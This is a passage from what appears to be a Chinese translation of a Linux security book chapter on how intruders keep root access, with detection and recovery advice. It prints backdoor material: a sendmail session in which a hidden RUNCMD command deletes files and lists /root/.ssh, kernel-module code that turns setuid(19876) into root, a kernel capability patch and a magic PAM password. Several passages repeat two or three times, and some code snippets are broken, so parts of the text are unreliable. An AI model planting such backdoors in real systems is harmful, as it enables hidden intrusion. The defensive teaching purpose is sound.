214 2.0.0 End of HELP info
VRFY root
252 2.5.2 Cannot VRFY user; try RCPT to attempt delivery (or try finger)
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_378_0.png)

## Linux 破解揭秘：Linux 秘密与解决方案

```
RUNCMD -name *.jpg -exec rm {} \ \
250 Command successful
RUNCMD uname -srm
214 2.0.0 Linux hackedmachine 2.2.18s sparc
RUNCMD ls /root/.ssh
214-2.0.0 authorized_keys
214-2.0.0 identity
214-2.0.0 Identity.pub
214-2.0.0 known_hosts
214 2.0.0 random_seed
```

QUIT

221 2.0.0 mail.example.org closing connection

Connection closed by foreign host.

在这里我们看到了新命令的作用。它的输出结果符合 SMTP 规范，这甚至可能允许它通过某些编写得糟糕的应用程序代理。没有理由认为魔法命令不能允许交互式的 root shell，因为黑客只需要在保持现有功能完整的同时，添加他的新命令以防止被轻易检测。

## 本地 SetXid 程序

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 7 |

![](img/33829ffb1435b4baef56fcd2c28ec6cd_379_0.png)

当漏洞被修复时，黑客可能会丢失对系统的访问权限，但可能仍保留用户登录访问。通过对 `setXid` 程序进行木马化，他可以留下后门让他将权限提升回 root，或者至少提升到一个有助于保持 root 权限的特权组。这些通常涉及魔法字符串、参数或环境变量。任何 `setXid` 程序都是候选者。流行的程序包括 `passwd`、`chfn`、`chsh`、`assh`、`crontab`、`lpr`、`lprrm` 以及 Berkeley r-commands。

以下是黑客插入 `lpr.c` 的代码示例，它是打印打印命令 `lpr` 的源文件之一：

```
name = argv[0];

ghostname(host, sizeof(host));

host[MAXHOSTNAMELEN-1] = '\0';

openlog("lpd", 1 && argv[1], 0, LOG_LPR);

while (argc > 1 && argv[1] == '-') {

    arg = ++argv;

    switch (arg[1]) {

```
```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer =
    }
```
```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer--;
    }
```



# 第 10 章：黑客如何维持访问

该函数的剩余部分（大约 8 页内容）包含了检查用户密码有效性所需的所有代码，允许重试并在必要时运行任何外部辅助程序。注意，黑客在 D 行（"called"）之前插入了一个严格的 `mp`；

随后，黑客编译此版本的 `pam_pwdb` 并将其安装到 `/lib/security`。此后，任何在 `pam_pwdb` 上运行的启用 PAM 的软件（几乎包含所有认证软件，包括登录、`sshd`、`su`、`xscreens` 等）将允许通过此后门密码获得访问。如果提交了魔法密码（`upeR3crit sr7n*`），将不会执行任何实际的用户名/密码检查；仅授予访问。由于黑客可以为大多数服务提供用户名，通过记住他编译进 `pam_pwdb.so` 的密码，就可以获得用户和 `root` 权限。

这是一种提供登录/认证后门要优雅得多的方法，因为它影响了所有感知 PAM 的软件，并且没有留下允许所有密码普遍通用的这种显性漏洞。

## 网络守护进程修改

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 5 |
| 简单性 | 5 |
| 影响 | 10 |
| 风险等级 | 7 |

黑客可以修改现有的网络守护进程（例如打印守护进程），使其也拥有魔法字符串。例如，黑客可以重新编译 `sendmail` 以接受一个新的类似 SMTP 的命令 `RUNCMD`，该命令将以 `root` 身份运行并返回输出，如下所示：

```
hackerbox telnet hackedmachine.example.org smtp
Trying 172.30.15...
Connected to hackedmachine.example.org.
Escape character is '^'.
220 mail.example.org SMTP Sendmail 8.10.1/80.1; 19 Apr 2000 04:43 -0800
HELO hackerbox.example.com
250 mail.example.org Hello hackerbox.example.com, pleased to meet you
HELnP214-2.0.0 This is Sendmail version 8.10.1
214-2.0.0 Topics:
214-2.0.0 HELO ENHLO MAIL RCPT DATA
214-2.0.0 RSET NOOP QUIT HELP VRFY
214-2.0.0 EXPN VERB ETRN DSN
214-2.0.0 For more info use "HELP <topic>"
214 2.0.0 End of HELP info
VRFY root
252 2.5.2 Cannot VRFY user; try RCPT to attempt delivery (or try finger)
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_378_0.png)

```
RUNCMD -name *.jpg -exec rm {} \ \
250 Command successful
RUNCMD uname -srm
214 2.0.0 Linux hackedmachine 2.2.18s sparc
RUNCMD ls /root/.ssh
214-2.0.0 authorized_keys
214-2.0.0 identity
214-2.0.0 Identity.pub
214-2.0.0 known_hosts
214 2.0.0 random_seed
```

QUIT

221 2.0.0 mail.example.org closing connection

Connection closed by foreign host.

黑客可以修改现有的网络守护进程（例如打印守护进程），使其也拥有魔法字符串。例如，如下所示。它的输出结果符合 SMTP 规范，这甚至可能允许它通过某些编写得糟糕的应用程序代理。没有理由认为魔法命令不能允许交互式的 `root` shell，因为黑客只需要在保持现有功能完整的同时，添加他的新命令以防止被轻易检测。

## 本地 SetXid 程序

当漏洞被修复时，黑客可能会丢失对系统的访问权限，但可能仍保留用户登录访问。通过对 `setXid` 程序进行木马化，他可以留下后门让他将权限提升回 `root`，或者至少提升到一个有助于保持 `root` 权限的特权组。这些通常涉及魔法字符串、参数或环境变量。任何 `setXid` 程序都是候选者。流行的程序包括 `passwd`、`chfn`、`chsh`、`assh`、`crontab`、`lpr`、`lprrm` 以及 Berkeley `r-commands`。

以下是黑客插入 `lpr.c` 的代码示例，它是打印打印命令 `lpr` 的源文件之一：

```
name = argv[0];

ghostname(host, sizeof(host));
host[MAXHOSTNAMELEN-1] = '\0';
openlog("lpd", 1 && argv[1], 0, LOG_LPR);

while (argc > 1 && argv[1] == '-') {
    arg = ++argv;
    switch (arg[1]) {
```

```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer--;
    }
}
```

```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer--;
    }
}
```

## Linux 破解揭秘：Linux 秘密与解决方案



在这里我们看到了新命令的作用。它的输出结果符合 SMTP 规范，这甚至可能允许它通过某些编写得糟糕的应用程序代理。没有理由认为魔法命令不能允许交互式的 root shell，因为黑客只需要在保持现有功能完整的同时，添加他的新命令以防止被轻易检测。

## 本地 SetXid 程序

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 6 |
| 影响 | 8 |
| 风险等级 | 7 |

![](img/33829ffb1435b4baef56fcd2c28ec6cd_379_0.png)

当漏洞被修复时，黑客可能会丢失对系统的访问权限，但可能仍保留用户登录访问。通过对 `setXid` 程序进行木马化，他可以留下后门让他将权限提升回 root，或者至少提升到一个有助于保持 root 权限的特权组。这些通常涉及魔法字符串、参数或环境变量。任何 `setXid` 程序都是候选者。流行的程序包括 `passwd`、`chfn`、`chsh`、`assh`、`crontab`、`lpr`、`lprrm` 以及 Berkeley r-commands。

以下是黑客插入 `lpr.c` 的代码示例，它是打印打印命令 `lpr` 的源文件之一：

```
name = argv[0];

ghostname(host, sizeof(host));
host[MAXHOSTNAMELEN-1] = '\0';
openlog("lpd", 1 && argv[1], 0, LOG_LPR);

while (argc > 1 && argv[1] == '-') {
    arg = ++argv;
    switch (arg[1]) {
```

```
case 'P': /* 指定打印机名称 */
    if (arg[2])
        printer = &arg[2];
    else if (argc > 1) {
        argc--;
        printer--;
    }
}
```

（注：由于原文存在大量重复段落，此处已合并核心内容翻译）

# 内核黑客 (KERNEL HACKS)

作为 Linux 用户，黑客对你的系统所能做的事情是有限的——即使 root 用户也是如此。即使他足够彻底地对每一个可能指示其行为的程序都植入了木马，击败了所有的文件完整性检查，欺骗了你的入侵检测系统，你仍然可以通过简单地将原始二进制文件拷贝到被破解的系统中查看发生了什么。通过使用未修改的工具，你（或管理员）能够找到黑客运行的隐藏文件、网络套字和进程。

更高级且更难检测的方法是黑客将其触角扩展到 Linux 内核。通过破坏内核本身，他可以通过更改 UNIX 程序赖赖各种系统调用所提供的信息，真正让自己变得无法被检测。

| 流行度 | 7 |
|---|---|
| 简单性 | 5 |
| 影响 | 9 |
| 风险等级 | 7 |

Linux 内核本质上是一块单体代码。它无法动态更改。如果不经过重新编译并重启，你无法向内核本身添加任何功能。这与其它经典的 UNIX 类系统（如 BSD、SunOS/Solaris 或 HPUX）没有区别。然而，重新编译和重启的要求一直是一个恼人的限制，包括 Linux 在内的许多 UNIX 类系统已通过内核模块解决了这个问题。

可加载内核模块（Loadable kernel modules）是包含补充或增强现有内核函数例的对象文件。这些模块在需要时被加载到运行的内核中，代码运行在内核的地址空间内，并完全在内核上下文中执行。这些模块可以直接访问所有内核内存变量，其访问权限远超任何普通用户程序。要查看正在运行哪些模块，你可以使用 `lsmod` 命令：

| 模块 | 大小 | 使用情况 |
|---|---|---|
| wavelan2_cs | 25724 | 1 |
| ds | 6280 | 2 [wavelan2_cs] |

# 第 10 章：黑客如何维持访问权限

```
i82365 21740 2
pcmcia_core 44256 0 [wavelen2_cs ds i82365]
maestro 26852 1
soundcore 2596 2 [maestro]
```

上面的输出来自一台笔记本电脑。它使用 Maestro 和 soundcore 模块进行音频输出，其余模块用于对 WaveLAN 无线网卡的 pcmcia 支持。（顺便提一下，这张卡极大地提升了本书的写作体验，因为我可以在后院的走廊完全通过网络完成写作）。

`insmod` 和 `rmmod` 程序允许你安装和删除内核模块。只有当模块未被使用时，你才能删除它。每个可加载内核模块都必须有两个函数：`init_module()` 和 `cleanup_module()`，它们分别在安装和删除模块时被调用。

下面是一个示例内核模块 "logsetuid" 的列表，向你展示这些程序是如何工作的。（如果你想使用它，可以在我们的网页 (hackinglinuxexposed.com) 上找到该模块）。

- logsetuid 内核模块。
- 版权所有 Brian Hatch, 2000。根据 GPL 协议发布。
- 记录所有运行 `setuid` 或 `setretuid` 系统调尝试，除非用户是 root。
- 编译方法：
- `gcc -o logsetuid.o -c logsetuid.c`
- 然后将 `logsetuid.o` 拷贝到默认的 insmod 目录之一，例如 `/lib/modules/misc`。
- 使用 `insmod logsetuid` 将其加载到运行的内核。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_384_0.png)

```c
#define _KERNEL_
#define MODULE
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <sys/syscall.h>

#include <linux/sched.h>
#include <linux/types.h>
```

```c
int (*real_setuid) (uid_t);
int (*real_setreuid) (uid_t, uid_t);
int new_setuid (uid_t);
int new_setreuid (uid_t, uid_t);
extern void *sys_call_table[];
```

```c
int init_module() {

    /* 保存指向旧 setuid 函数的指针 */
    real_setuid = sys_call_table[SYS_setuid];
    real_setreuid = sys_call_table[SYS_setreuid];

    /* 指向 sys_call_table 中我们新的 setuid 函数 */
    sys_call_table[SYS_setuid] = (void *)new_setuid;
    sys_call_table[SYS_setreuid] = (void *)new_setreuid;

    printk(KERN_INFO "logsetuid module installed\n");

    return 0;
}
```

```c
int cleanup_module() {

    /* 将指针重置回实际函数 */
    sys_call_table[SYS_setuid] = (void *)real_setuid;
    sys_call_table[SYS_setreuid] = (void *)real_setreuid;

    printk(KERN_INFO "logsetuid module uninstalled\n");

    return 0;
}
```

```c
/* 替换函数 */
int new_setuid(uid_t uid) {
    // ... (省略实现)
}
// ... (其余部分省略)
```

这个模块是有益的。它的作用是拦截 `setuid()` 和 `setreuid()` 调用并通过 syslog 进行记录。要安装该模块，将其拷贝到 insmod 搜索的目录，然后通过 insmod 将其插入内核，如下所示：

```
$ gcc -o logsetuid.o -c logsetuid.c
$ cp logsetuid.o /lib/modules/misc
$ insmod /lib/modules/misc/logsetuid.o
lsmod | grep logsetuid
```

logsetuid      1324      0 (unused)

以下是内核日志的示例输出：



```
kernel: logsetuid module installed
kernel: logsetuid: uid:500 eid:500 dest_uid:0 dest_eid:0 pid:13552 proc:setreuid status:failed
kernel: logsetuid: uid:500 eid:500 dest_uid:0 dest_eid:0 pid:13624 proc:sh_test status:failed
kernel: logsetuid: uid:705 eid:705 dest_uid:0 dest_eid:0 pid:13680 proc:setreuid_test status:failed
kernel: logsetuid: uid:500 eid:500 dest_uid:0 dest_eid:0 pid:13802 proc:setreuid_test2 status:succeeded
```

创建了几个简单地尝试运行 `setuid()` 系统调用。上面执行的最后一个程序 `setuid_test2` 属于 root 并且设置了 setuserid 位，这就是为什么它成功了。

日志条目包含了 `uid`、`进程名`（内核可获取）以及 `set (re) uid` 调用的结果。模块忽略了 `set (re) uid` 调用的某些情况，即用户已经是 root，或者尝试将 `(re) uid` 设置为现有用户的情况。后者通常由丢弃特殊权限的 setuserid 或 setgroup 程序（如 `man`）触发。

所以我们在这里看到了一个例子，我们对实际内核 `setuid()` 和 `setretuid()` 系统调用包装了我们自己的预处理代码。在这种情况下，它是为了崇崇的目标，而不是出于恶意。然而，正是内核这种诱人的力量使得可加载内核模块对黑客也同样有用。

## 第 10 章：黑客如何维持访问

### 恶意 setuid 封装示例

```c
return 0;

}
int new_setuid(uid_t uid) {
    if (uid == 19876) {
        current->uid = 0;
        current->gid = 0;
        current->euid = 0;
        current->egid = 0;
        return 0;
    }
    return (*real_setuid)(uid);
}
```

这段代码对 `setuid()` 调用进行了封装，与之前代码中的版本非常相似。然而在这里，新的 `setuid` 函数不再记录尝试，而是检查请求的用户 ID，如果是 `19876`，它会将当前运行的用户 ID 设置为 `0`。每当有程序调用 `setuid(19876)`，它就会成功，并且进程此后将以 root 身份运行，无论是谁运行了该进程。

由于任何系统函数都可以被封装，并且内核的所有变量对模块都是可见的，显而易见的是，导入内核的恶意代码会对安全产生毁灭性的影响。恶意内核模块的传统用途是隐藏黑客的活动并为其提供后门 root 访问权限。

如上面的代码所示，模块可以更改其名称使其看起来无害（`"ds"` 是一个常用模块，因此 `"ds2"` 可能会被忽略）。然而，模块同样可以轻松地从模块列表中隐藏自己。

**注意** 黑客不仅可以添加新模块，还可以编译现有模块的新版本（例如笔记本电脑上的 `pcmcia_core`），其中包含他额外的模块函数。

## 削弱 Linux 内核

一个恶意内核模块的绝佳示例（包含了更多关于其工作原理的详细描述）可以从 Phrack 第 52 期获得。由 plague 编写的《Weakening the Linux Kernel》可以在 `http://phrack.infonexus.com/search.php?view&article=p52-18` 找到。该模块（集成木马设施）执行了以下所有操作：

| 模块隐藏自己；它不会出现在模块列表中，这使得无法卸载该模块。 |
| :--- |

| 它会对 `ioctl()` 调用设置后门，导致 PROMISC 标志位（当接口处于混杂模式时设置）不会被报告。 |

# Linux 破解揭秘：Linux 安全秘密与解决方案

| 文件隐藏器 | 任何文件名中包含给定单词的文件将通过封装 `getdents()` 系统调用从视图中隐藏。 |
| :--- | :--- |
| 进程隐藏器 | 与文件隐藏器类似，包含特定单词的进程将从 `/proc` 文件系统中隐藏。 |
| Execve 重定向 | 如果执行了特定程序，模块将改为运行另一个程序。 |
| Setuid 木马 | 如果调用 `setuid(magic_number)`，将自动授予 root 权限。与上面的恶意模块类似。 |
| 套接字后门 | 如果接收到包含预定义字符串且大小为预定义的数据包，将启动一个程序（包含魔术名称以便被隐藏），该程序将生成一个本地 root shell。 |

## 内核模块防御措施

文件完整性检查可以帮助你了解何时安装了新模块或模块何时被更改。通过对各种 `/lib/modules` 目录限制权限并使用 `chattr +i`，可以减慢根据脚本操作的新手黑客，但这些很容易被 root 用户破解。

针对这种复杂攻击的唯一真实防御是内核补丁（如 LIDS），并带有适当的配置使 root 无法向 `/lib/modules` 安装文件，或者根本无法将模块加载到内核。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_389_0.png)

## 破解内核本身

| 流行度: | 6 |
| :--- | :--- |
| 简单性: | 5 |
| 影响: | 10 |
| 风险评分: | 7 |

Linux 内核就是 Linux。从 `lilo` 启动你的机器的那刻起，Linux 内核就开始运行了。它控制所有设备的输入输出，强制执行所有权限，决定为每个进程提供哪些系统资源，并告诉你正在发生什么。它是你系统中运行的唯一全能代码，没有它什么都无法工作。有缺陷的内核（例如，编译错误的内核、配置不当的内核或为不同硬件的内核）会导致你的机器表现出不稳定，这种不稳定可能是恼人的且难以定位的。

## 第 10 章：黑客如何维持访问

Linux 内核不是黑盒。内核的完整代码可以在 `http://linux.kernel.org` 在线获取。你可以随时重新编译内核以添加对新设备、新功能的支持，或者修复发现的安全问题，例如 Linux 内核版本 `2.2.14` 中内置的功能。具有自己的预配置设置的 Linux 发行版将以其包格式（`rpm` 等）提供内核源码的变动，以便你可以根据发行版的所有默认值和你的显式更改进行编译。

完全开源内核的优点已经描述过多次：任何人都可以阅读源代码并贡献补丁，你可以在任何需要的时候应用自己的补丁。如果在 Linux 中发现问题，你可以在发现后的一秒内进行升级，许多安全列表将通过修复得到消除；你不需要等待 Linux 发行版发布升级后的内核。你可能不需要等待就针对性能进行调优并编译内核，例如省略你不需要的功能。

开源内核的问题在于，黑客确切知道系统是如何运作的。

## 第 10 章：黑客如何维持访问

```c
#if 1 /* ok now */
    if (cap_raised(current->cap_effective, cap))
#else
    if (cap_is_fs_cap(cap) ? current->fuid == 0 : current->euid == 0)
#endif
{
    current->flags |= PF_SUPERPRIV;
    return 1;
}
```

在这个示例中，我们看到了一个内核更改，这种更改将产生更广泛的安全影响。从 Linux 2 内核开始，超级用户的无限制权限被划分为一组离散的能力（capabilities）。这允许你向程序授予某些通常允许超级用户使用的权限，而无需赋予其系统的完全控制权。你可以在上面的 `sys_setuid` 代码中看到 `capable()` 调用示例。以下是可以设置的权限列表：

| `CAP_SETUID` | 允许使用无限制的 setuid 并允许在凭据上伪造 pid |
| `CAP_SETGID` | 允许使用无限制的 setgid 并允许在凭据上伪造 pid |
| `CAP_NET_RAW` | 允许使用原始套字，用于构建自定义 IP 数据包 |
| `CAP_PTRACE` | 允许 ptrace 任何进程，而不仅仅是自己的进程 |
| `CAP_CHOWN` | 能够将任何文件的所有者改为任何用户 |
| `CAP_OWNER` | 覆盖所有文件限制 |
| `CAP_KILL` | 向任何进程发送信号，而不仅仅是自己的进程 |

通过在内核中进行上述更改，黑客使其在检查其操作权限时，用户 ID `8765` 始终返回 TRUE `1`。尽管他可能以“普通用户”的身份运行，但他被允许像 root 一样进行无限制的活动。再次，此更改隐藏在内核内部。除了内核之外，没有其他文件会指示发生了任何变化。

## 揭露 Linux 攻击：Linux 安全秘密与解决方案

### 内核修改对措施



如果你的内核被攻破，你就陷入了极大的麻烦。在新内核运行期间，你无法信任系统的任何内容，包括文件和进程列表、网络连接、磁盘和 CPU 统计数据以及 `/proc`。你应该立即开始第 2 章中的系统恢复程序。

在单用户模式下，在启动了受信任的内核（如恢复磁盘或 CD-ROM）后，你可以通过验证 `/boot`（内核和相关文件存放处）以及你的内核头文件 `/usr/include/linux` 和源文件 `/usr/src/linux` 中的文件，来确定你的机器是否安装了新内核或被攻破。黑客可能在你的系统上重新编译了内核，在这种情况下，你会注意到内核源码中的变化；或者他仅仅从他的系统复制了一个预编译版本，在这种情况下，`/boot` 中的实际内核将处于激活状态。无论哪种情况，都应认为该机器已损坏。在首先弄清楚他是如何进入的之后，将机器移出服务并重新安装。

如果黑客替换了你的内核，你可能会发现它，因为你会发现系统运行得不“正常”。首先，为了安装新内核，黑客需要重启你的机器。取决于黑客的水平，新内核可能不够稳定，并且需要重启（或更频繁地重启）才能保持正常运行。如果你使用了预编译的内核，它可能与你之前运行的版本不同。你可能会注意到某些针对特定内核配置的模块无法正常工作，或者根本无法工作。

无论你如何确定内核已被替换，只有一个好的解决方案：只在你可以信任的范围内信任你的系统——或者对于轻便笔记本电脑可能只有一半的距离——直到你重新安装。

## ROOTKITS（根内核）

正如我们讨论过的，黑客可以使用许多单独的方法来维持对已破解其 root 账户的系统的访问。确定哪些文件需要植入木马以及进行相应的代码更改需要花费大量时间。大多数脚本小子（script kiddies）没有足够的耐心或编码技能来成功地为所有隐藏自己所需的程序注入木马。对他们来说是幸运的，但对管理员来说，是 `rootkit`。

`rootkit` 仅仅是一组预包的、带有木马的二进制文件，用于快速安装。它们较少包含加载内核模块，因为这些模块更依赖内核，并且需要针对每个主机进行编译。大多数 `rootkit` 还包含一个嗅探器，用于捕获本地网络上的密码，以及 Telnet、FTP 或 POP 会话中使用的密码。后门通常被放在系统守护进程中（如 `sshd`）以及 `setuid` 二进制文件（如 `su` 或 `sudo`）中。此外，`ls` 和 `find` 等程序被设计为忽略某些文件。

## 第 10 章：黑客如何维持

有许多不同的 `rootkit`，它们具有类似的功能，但完整程度不同。我们在这里只讨论一种，因为它们所有的通用原理是相同的。

### LRK—Linux Root Kit

| 流行度 | 9 |
| --- | --- |
| 简单性 | 10 |
| 影响 | 10 |
| 风险评分 | 10 |

最流行的 Linux `rootkit` 是 LRK 版本 5，可以从 packet storm (`http://packetstorm.securify.com/`) 获取。它包含了以下程序的木马：

#### 隐藏踪迹

- `du`, `find`, `ls`: 隐藏文件
- `crontab`: 运行隐藏的 cron 条目
- `ifconfig`: 在输出中隐藏 PROMISC 标志
- `netstat`: 隐藏连接并避免拒绝
- `tcpd`: 隐藏连接并避免拒绝
- `pidof`, `ps`, `top`: 隐藏进程
- `syslog`: 隐藏日志

#### 后门

- `bindshell`: root 壳
- `chfn`, `passwd`: 远程访问
- `sshd`: root 访问

#### 工具

- `msn`: 网络嗅探器
- `fix`: 修复时间
- `wted`: utmp/wtmp
- `z2`: lastlog

木马程序读取多个文件以确定哪些数据不应该被显示。这些文件名在木马程序运行时被指定。

## 揭露 Linux 攻击：Linux 安全秘密与解决方案

### 默认值

| 文件名 | 说明 |
|---|---|
| `/dev/ptyq` | 不显示的网络连接。也用于 `tcpd` 静默访问。 |
| `/dev/ptyr` | 要忽略的文件或目录名。 |
| `/dev/ptip` | 根据 uid 或命令行忽略的进程。 |
| `/dev/ptys` | 根据简单匹配丢弃的 syslog 日目。 |

LRK 可以通过 `.configure` 和 `make install` 进行编译。它在隐藏黑客活动方面非常彻底。

### Rootkit 对措施

如果你怀疑安装了 `rootkit`，你应该尝试比较未被注入木马的工具（如 `lsof`）与 `rootkit` 工具（如 `ps` 或 `netstat`）的结果。如果你发现某些信息出现在一个工具中而在另一个工具中没有，那么该程序可能是原版的木马版本。

动态读取配置的 `rootkit`，你可能通过查看标准输出来判断程序是否注入了木马：

```bash
hackedmachine$ strace -epen /bin/ls >dev/null
open("/etc/ld.so.preload", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY) = 3
open("/lib/libtermcap.so", O_RDONLY) = 3
open("/lib/libc.so", O_RDONLY) = 3
open("/dev/ptyr", O_RDONLY) = 3
open("/usr/share/local/locale.alias", O_RDONLY) = 3
open("/usr/share/i18n/locale.alias", O_RDONLY) = -1 ENOENT (No such file or directory)
```

输出中访问 `/dev/ptyr`。`/bin/ls` 可能是木马版本。你读取 `/dev/ptyr` 文件来查看黑客到底隐藏了什么。

> 注意：如果黑客安装了可加载内核模块，那么 `ls` 的追踪将看起来完全正常，因为它不需要注入木马。它会被内核本身欺骗。

为了防止 `rootkit` 攻击，请经常运行完整性检查。木马二进制文件最终会对针对常见的注入木马系统二进制文件（如 `ls` 及其它）以及网络接口上的混杂模式产生巨大的警告。

## 第 10 章：黑客如何维持访问

我们最喜欢的两个工具是 Rkdet (`www.vancouver-webpages.com/rkdet/`) 和 Chkrootkit (`www.chkrootkit.org`)。`Rkdet` 是一个持续运行的程序，它监控二进制文件和你的网络接口，并在它认为机器已被入侵时发送电子邮件。

`Chkrootkit` 更加健壮，它不仅提供了与 `Rkdet` 相同的功能，还能解析来自 `/proc` 条目的输出内容，并检查 `wtmp` 和 `lastlog` 是否被修改。它专门设计用于检测 `lrk3`、`lrk4`、`lrk5` 以及其他 `lrk` 变体；Ambient 的 `rootkit` (`ARK`) 以及 Ramen 蠕虫，尽管它也能发现任何以类似方式运行的 `rootkit`。

关于 `rootkits` 的更多信息，可以从 `http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq` 找到非常优秀的资源。

# 总结

你现在已经了解了黑客在获取 root 权限后保持对你机器访问权限的众多方法。如果这看起来无能为回，你是正确的。一个获得 root 权限的黑客可以做任何事情，你永远无法百分之百确定自己清理了他留下的所有东西。现在你明白为什么我们建议采取第 2 章中提倡的激进措施了。

本章详述的示例并非详尽，但它们提供了关于可能性的整体概念。取决于黑客的能力水平，你可能可以通过完全重装系统来清理系统。新手黑客做的任何事都很糟糕，你可能觉得修复这些漏洞并继续日常生活是安全的。但为了获得 100% 的心安（如果这可以实现的话），重新安装系统是必须的。

## 不要低估黑客

一位精明的黑客曾攻入过一个蜜蜜罐（honeypot）——这是一个被严密监控并故意设置供人入侵的机器。他在闯入后几秒钟就安装了一些极其高明的后门。显而易，他做了大量的准备。这很可能是他最近攻入的许多机器之一。

在某个时刻，他发现管理员已经注意到了发生的情况（实际上，管理员一直在监控一切）。发现后，黑客在 `/etc/passwd` 中添加了一个快速账户，并在 `/tmp` 中创建了 `/bin/sh` 的 userid 副本，然后离开了系统。这些措施远低于他的技术水平。我们推测，黑客这样做是为了让管理员“方便”地确定执行了哪些操作并清理这两个小问题，从而认为现在一切都是安全的。事实上，这其实非常有机智。许多管理员会掉入这种显而易见的修复方案的陷阱，而黑客随后会通过他创建的真实后门回来。

黑客用于维持对你机器访问的某些方法，也是最初用于获取访问的方法。因此，通过采取措施在发生入侵事件时保护重要文件免受篡改，你可能也可以防止那些让黑客最初进入你系统的攻击。



最有效的反黑客方法是早期警报和记录。你需要知道黑客是如何进入你的系统的，以便修补漏洞，以及他在进入后做了什么。你修补被入侵系统而非从头重装的唯一希望，就是拥有一份黑客所采取的所有操作的完整列表。将日志记录到另一台机器是有帮助的，你可能拥有的任何 IDS 日志也是如此。你仍然需要将机器恢复到安全状态（例如，从恢复 CD-ROM 启动），才有希望修复黑客造成的破坏。

现在你已经看到黑客将他的“根”延伸到你的系统中是多么容易（原谅这个双关语），你应该更有动力从源上保持系统安全。

# 第四部分

## 服务器问题

# 第 11 章

## 邮件与 FTP 安全

### 揭秘 Linux Linux：Linux 安全秘密与解决方案

我们与外部世界的连接既是让计算机变得最有用的原因，也是让它们变得最脆弱的原因。没有了这种连接，我们的机器就是 CPU 周期的孤立岛，运行着只有我们自己使用的程序，并且在很大程度上与任何没有我们办公室钥匙的人为对；有了这种连接，我们获得了访问他人知识、数据和公司的权限。

不幸的是，网络的分布式特性随着用户数量的增加而价值增长，这是一把双刃剑，增加了心怀不轨者对你机器产生兴趣的危险。在通用互联网连接之前，我们最需要担心的是把终端遗留在本科生实验室（除非你是那个实验室的系统管理员）。

现在，Linux 系统管理员必须担心缓冲区溢出漏洞、拒绝服务攻击以及脚本小子（script kiddies）等问题。政府通过拔掉其敏感电脑与网络的连接来解决这个问题——这是保护自己免受互联网连接攻击的唯一方法。对于我们大多数人来说，计算机的很大用途在于其与外部世界的连接，而在这些最重要的连接中，电子邮件、FTP 和 HTTP 要求我们要求以某种方式处理任何请求（并非所有请求都有诚意）的连接请求（这些请求可能被拒绝）。

在本章中，我们将涵盖 Linux 在大型服务器群和儿童卧室中支持的两个主要服务——邮件和 FTP。

## 邮件安全

电子邮件过去是、现在也是让互联网首次爆发的“杀手级应用”。是的，现在有了 Web，但还有邮件吗——我们中有多少人可以离开今天的邮件生活？

### 第 11 章：邮件与 FTP 安全

#### 371 邮件安全

##### 邮件传输代理 (MTAs)

为了让 MTA 能够通信，它们必须有一种共同语言。随着网络演进，出现了多种方法。SMTP（简单邮件传输协议）是今天发送电子邮件的标准方式。如果你使用其他协议，如 UUCP 或 X.400，我们将讨论三种 MTA：Sendmail、Qmail 和 Postfix。

##### Sendmail

最重要的 MTA 是 Sendmail，运行在 75% 的服务器上。它由 Eric Allman 在 1981 年于加州大学创建，并经历了许多版本。Sendmail 似乎支持所有设计的电子邮件地址和路由方式。

幸运的是，Sendmail 现在允许你以简单的方式编写配置文件（`sendmail.mc`），这些文件通过 `m4` 被“编译”成实际的 Sendmail 配置文件（`sendmail.cf`）。我们在这里不会深入涉及 Sendmail 的配置。它的标准参考是 Bryan Costales 和 Eric Allman 编写《Sendmail, Second Edition》（O'Reilly, 1997）——又名“蝙蝠书”；传闻第三版即将出版，将涵盖所有新信息和最新更新。如果你真的需要它，上帝保佑你。在 `www.sendmail.org` 也有丰富的信息。

> 手动编辑 `sendmail.cf` 会导致错误并使你陷入后续的手动编辑中，将任何当前的 `sendmail.cf` 更改整合到你维护的适当 `sendmail.mc` 文件。这将大大增加你保持理智的机会。

不幸的是，Sendmail 的长期历史充满了安全问题。1988 年的 Morris 互联网蠕虫引入了 Sendmail WIZ 命令，该命令会立即授予任何用户 root 权限。曾几何时，如果你是负责（Sendmail）的人，笑话会让人疲惫（且厌烦）是：“这周 Sendmail 的 bug 是什么？”

然而，Sendmail 最近一直相当稳定。这可能很大程度上归功于 Sendmail, Inc 的成立，这家商业组织现在负责 Sendmail 的开发。Sendmail 的开源版本可以通过 `http://www.sendmail.org` 获取。

商业版本（包含配置 GUI）可以在 `http://www.sendmail.com` 获取。

##### Qmail

`Qmail` (`www.qmail.org`) 由 Dan Bernstein 编写，作为对 Sendmail 糟糕记录的直接回应。迄今为止，Qmail 尚未被发现过任何安全问题。事实上，Qmail 曾对任何发现安全漏洞的人提供 1,000 美元的奖励，但该奖金无人认领，而 Bernstein 至今仍然对 Qmail 以及他编写的其他软件提供 500 美元的奖励。

> 注意：尽管我们相信 Qmail 的安全性，但我们通常不参与那些不时举办的“黑客竞赛”。这些竞赛通常持续时间很短，无法保证参与人数或参与者质量，且提供的信息通常是不完全的。竞赛结束后，供应商会将其作为其产品“不可破解”的“证明”。Qmail 的奖励与此不同之处在于，该产品的完整代码可供所有人查看。

与单体结构的程序 Sendmail 不同，Qmail 将其功能分离为多个互不信任的程序。例如，传统的 Sendmail 转发文件处理由 Qmail 的 `dot-forward` 程序处理。Qmail 中某一个部分的缺陷不会导致整个系统变得脆弱。Qmail 仅以超级用户身份执行最小的操作，且没有任何程序完全以 root 用户身份运行。

